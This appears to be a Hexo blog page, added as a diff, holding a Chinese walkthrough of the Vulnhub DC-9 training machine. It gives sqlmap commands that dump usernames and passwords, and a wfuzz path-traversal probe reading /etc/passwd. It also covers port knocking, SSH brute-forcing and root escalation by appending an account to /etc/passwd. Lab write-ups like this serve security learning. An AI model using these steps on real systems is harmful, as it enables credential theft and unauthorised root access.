@@ -1,0 +1,298 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Vulnhub-DC9 | Ep0ch</title><meta name="author" content="Zs"><meta name="copyright" content="Zs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="DC-9信息收集下载好靶机后，将靶机网络设置为net模式 kali扫描主机 arcp-scan -l  访问页面  dirb扫描发现扫出来的目录与页面展示的目录一样‘   nmap扫描查看开放的端口  80端口开放，22端口关闭 漏洞利用在&#x2F;search.php页面存在登录界面，猜测存在sql注入 sqlmap测试  存在sql注入漏洞，依次爆库名，表名，列名 sqlmap -u htt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub-DC9">
+<meta property="og:url" content="http://example.com/posts/35045482/index.html">
+<meta property="og:site_name" content="Ep0ch">
+<meta property="og:description" content="DC-9信息收集下载好靶机后，将靶机网络设置为net模式 kali扫描主机 arcp-scan -l  访问页面  dirb扫描发现扫出来的目录与页面展示的目录一样‘   nmap扫描查看开放的端口  80端口开放，22端口关闭 漏洞利用在&#x2F;search.php页面存在登录界面，猜测存在sql注入 sqlmap测试  存在sql注入漏洞，依次爆库名，表名，列名 sqlmap -u htt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/baji2.jpg">
+<meta property="article:published_time" content="2024-09-06T12:36:20.000Z">
+<meta property="article:modified_time" content="2024-09-06T12:40:15.769Z">
+<meta property="article:author" content="Zs">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/baji2.jpg"><link rel="shortcut icon" href="/img/index.jpg"><link rel="canonical" href="http://example.com/posts/35045482/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Zs","link":"链接: ","source":"来源: Ep0ch","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Vulnhub-DC9',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-06 20:40:15'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/epoch.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/baji2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Ep0ch"><img class="site-icon" src="/img/epoch.jpg#%20image"/><span class="site-name">Ep0ch</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulnhub-DC9</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-06T12:36:20.000Z" title="发表于 2024-09-06 20:36:20">2024-09-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-06T12:40:15.769Z" title="更新于 2024-09-06 20:40:15">2024-09-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">781</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Vulnhub-DC9"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="DC-9"><a href="#DC-9" class="headerlink" title="DC-9"></a>DC-9</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>下载好靶机后，将靶机网络设置为net模式</p>
+<p>kali扫描主机 <code>arcp-scan -l</code></p>
+<p><img src="https://pic.imgdb.cn/item/66dabed4d9c307b7e9271e17.png"></p>
+<p>访问页面</p>
+<p><img src="https://pic.imgdb.cn/item/66dabef1d9c307b7e92733a7.png"></p>
+<p>dirb扫描发现扫出来的目录与页面展示的目录一样‘</p>
+<p><img src="https://pic.imgdb.cn/item/66dae157d9c307b7e95311c4.png"></p>
+<p><img src="https://pic.imgdb.cn/item/66dae171d9c307b7e9535971.png"></p>
+<p>nmap扫描查看开放的端口</p>
+<p><img src="https://pic.imgdb.cn/item/66dae206d9c307b7e9540bfb.png"></p>
+<p>80端口开放，22端口关闭</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在&#x2F;search.php页面存在登录界面，猜测存在sql注入</p>
+<p>sqlmap测试</p>
+<p><img src="https://pic.imgdb.cn/item/66dae387d9c307b7e956842f.png"></p>
+<p>存在sql注入漏洞，依次爆库名，表名，列名</p>
+<p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch --dbs</code></p>
+<p><img src="https://pic.imgdb.cn/item/66dae428d9c307b7e957e370.png"></p>
+<p>首先查看users库的内容</p>
+<p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D users --tables</code></p>
+<p><img src="https://pic.imgdb.cn/item/66dae4a5d9c307b7e958901a.png"></p>
+<p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D users -T UserDetails --columns</code></p>
+<p><img src="https://pic.imgdb.cn/item/66dae533d9c307b7e959a422.png"></p>
+<p>查看username与password的内容</p>
+<p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D users -T UserDetails -C username,password --dump</code></p>
+<p><img src="https://pic.imgdb.cn/item/66dae59dd9c307b7e95a6f24.png"></p>
+<p>将得到的username与password分别保存到user与password中</p>
+<p>选一个用户在&#x2F;manage.php页面登录，发现报错</p>
+<p>接着查看Staff库的内容</p>
+<p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D Staff --columns</code></p>
+<p><img src="https://pic.imgdb.cn/item/66dae67ad9c307b7e95cf176.png"></p>
+<p><code>sqlmap -u http://192.168.154.136/results.php --data &quot;search=many&quot; --level=5 --batch -D Staff -T Users -C Username,Password --dump</code></p>
+<p><img src="https://pic.imgdb.cn/item/66dae74ad9c307b7e95e4f32.png"></p>
+<p>发现一个新的账号和密码，尝试登录发现成功</p>
+<p><img src="https://pic.imgdb.cn/item/66dae7a1d9c307b7e95e98c1.png"></p>
+<p>根据成功登录后的界面File does not exist猜测可能存在文件包含漏洞</p>
+<p><code>noglob wfuzz -c -u http://192.168.154.136/manage.php?FUZZ=../../../../../etc/passwd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H &quot;Cookie:PHPSESSID=80guork76fj0lt1gq8nvnasdhb&quot; --hw 100</code></p>
+<p><img src="https://pic.imgdb.cn/item/66daec6ed9c307b7e9638d6f.png"></p>
+<p>存在file参数</p>
+<p>尝试使用BurpSuite爆破</p>
+<p><img src="https://pic.imgdb.cn/item/66daedabd9c307b7e964bcd0.png"></p>
+<p>接着访问&#x2F;proc&#x2F;sched_debug查看cpu的调度状况</p>
+<p><img src="https://pic.imgdb.cn/item/66daeeb3d9c307b7e965ce40.png"></p>
+<p>在调度进程中发现knockd</p>
+<p><img src="https://pic.imgdb.cn/item/66daef07d9c307b7e966d7ac.png"></p>
+<p>knockd.conf文件存在于&#x2F;etc&#x2F;knockd.conf下，与ssh端口的开放有关</p>
+<p>访问knockd的目录，查看其内容</p>
+<p><img src="https://pic.imgdb.cn/item/66daefaed9c307b7e96894a9.png"></p>
+<p>意思为依次顺序访问7469，8475，9842端口后，ssh的22端口开放，逆序访问则关闭，那么依次访问端口</p>
+<p><img src="https://pic.imgdb.cn/item/66daf041d9c307b7e969ab56.png"></p>
+<p>访问后发现22端口开放</p>
+<p>下面从22端口入手，将上文中我们得到的用户名和密码爆破</p>
+<p><img src="https://pic.imgdb.cn/item/66daf11bd9c307b7e96ba1e7.png"></p>
+<p>得到三个用户名与密码</p>
+<p>依次尝试ssh连接，在janitor用户下发现多一层目录</p>
+<p><img src="https://pic.imgdb.cn/item/66daf1c4d9c307b7e96d2aab.png"></p>
+<p>发现新的密码，将新的密码保存起来，再结合之前的用户名再次爆破</p>
+<p><img src="https://pic.imgdb.cn/item/66daf2dcd9c307b7e96ec197.png"></p>
+<p>发现新的用户名和密码，ssh连接访问</p>
+<p><img src="https://pic.imgdb.cn/item/66daf3bcd9c307b7e9710a4b.png"></p>
+<p>sudo -l查看用户权限</p>
+<p>发现可以不需要密码访问test</p>
+<p>查看test的文件属性，发现使可执行文件</p>
+<p><img src="https://pic.imgdb.cn/item/66daf49ed9c307b7e973050e.png"></p>
+<p>在&#x2F;opt&#x2F;devstuff&#x2F;下可以发现源码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>作用就是将一个文件的内容读取出来，并追加到另一个文件中</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>那么我们可以尝试直接追加一个有root权限的账号到&#x2F;etc&#x2F;passwd中</p>
+<p><img src="https://pic.imgdb.cn/item/66daf5a2d9c307b7e973fc12.png"></p>
+<p>先将生成的账号添加到临时文件中，再使用test追加到&#x2F;etc&#x2F;passwd&#x2F;中</p>
+<p><img src="https://pic.imgdb.cn/item/66daf67fd9c307b7e974c5fd.png"></p>
+<p>提权后访问&#x2F;root&#x2F;成功拿到flag</p>
+<p><img src="https://pic.imgdb.cn/item/66daf6ead9c307b7e97522c7.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Zs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/posts/35045482/">http://example.com/posts/35045482/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Ep0ch</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/">安全</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="post_share"><div class="social-share" data-image="/img/baji2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/ff3ef111/" title="Vulnhub靶机--AI-Web1"><img class="cover" src="/img/BaJi.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-02</div><div class="title">Vulnhub靶机--AI-Web1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/epoch.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Zs</div><div class="author-info__description">人山人海呀~</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DC-9"><span class="toc-number">1.</span> <span class="toc-text">DC-9</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/35045482/" title="Vulnhub-DC9"><img src="/img/baji2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub-DC9"/></a><div class="content"><a class="title" href="/posts/35045482/" title="Vulnhub-DC9">Vulnhub-DC9</a><time datetime="2024-09-06T12:36:20.000Z" title="发表于 2024-09-06 20:36:20">2024-09-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ff3ef111/" title="Vulnhub靶机--AI-Web1"><img src="/img/BaJi.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vulnhub靶机--AI-Web1"/></a><div class="content"><a class="title" href="/posts/ff3ef111/" title="Vulnhub靶机--AI-Web1">Vulnhub靶机--AI-Web1</a><time datetime="2024-09-02T05:24:07.000Z" title="发表于 2024-09-02 13:24:07">2024-09-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/5286b664/" title="WEB刷一刷"><img src="/img/web.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WEB刷一刷"/></a><div class="content"><a class="title" href="/posts/5286b664/" title="WEB刷一刷">WEB刷一刷</a><time datetime="2024-08-10T03:08:57.000Z" title="发表于 2024-08-10 11:08:57">2024-08-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/54d49677/" title="CISCN2023烧烤摊儿"><img src="/img/PWNciscn.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CISCN2023烧烤摊儿"/></a><div class="content"><a class="title" href="/posts/54d49677/" title="CISCN2023烧烤摊儿">CISCN2023烧烤摊儿</a><time datetime="2024-08-09T08:07:34.000Z" title="发表于 2024-08-09 16:07:34">2024-08-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d66b9a90/" title="BUUCTF 刮开有奖"><img src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF 刮开有奖"/></a><div class="content"><a class="title" href="/posts/d66b9a90/" title="BUUCTF 刮开有奖">BUUCTF 刮开有奖</a><time datetime="2024-08-08T04:00:00.000Z" title="发表于 2024-08-08 12:00:00">2024-08-08</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/baji2.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2024 By Zs</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">I wish you to become your own sun, no need to rely on who's light.
+<p>
+  <a target="_blank" href="https://hexo.io/">
+    <img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo">
+  </a>&nbsp;
+  <a target="_blank" href="https://butterfly.js.org/">
+    <img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly">
+  </a>&nbsp;
+  <a target="_blank" href="https://www.jsdelivr.com/">
+    <img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用JsDelivr为静态资源提供CDN加速">
+  </a>&nbsp;
+  <a target="_blank" href="https://vercel.com/">
+    <img src="https://img.shields.io/badge/Hosted-Vervel-brightgreen?style=flat&logo=Vercel" title="本站采用双线部署，默认线路托管于Vercel">
+  </a>&nbsp;
+  <a target="_blank" href="https://vercel.com/">
+    <img src="https://img.shields.io/badge/Hosted-Coding-0cedbe?style=flat&logo=Codio" title="本站采用双线部署，联通线路托管于Coding">
+  </a>&nbsp;
+  <a target="_blank" href="https://github.com/">
+    <img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Github托管">
+  </a>&nbsp;
+  <a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">
+    <img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可">
+  </a>
+</p>
+<script src="//code.tidio.co/igzcydyc0v4yli1cqhy75vfxpqucu4lm.js"></script>
+</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><!-- hexo injector body_end start 